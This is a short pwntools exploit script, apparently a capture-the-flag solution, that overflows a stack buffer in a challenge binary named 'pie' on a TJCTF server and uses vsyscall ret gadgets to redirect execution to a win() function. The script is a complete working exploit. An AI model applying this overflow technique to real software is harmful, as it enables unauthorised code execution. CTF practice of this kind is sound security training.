#!/usr/bin/env python

from pwn import *

local = 0

if local:
	r = process("./pie")
else:
	r = remote("p1.tjctf.org", 8004)

VSYSCALL_GADGET = 0xffffffffff600000


payload = ''
payload += "40\n" # size of our input
payload += "A"*24 # filler
payload += p64(VSYSCALL_GADGET) # first ret
payload += p64(VSYSCALL_GADGET) # second ret

# now the next addr on the stack is win()

r.sendline(payload)

r.interactive()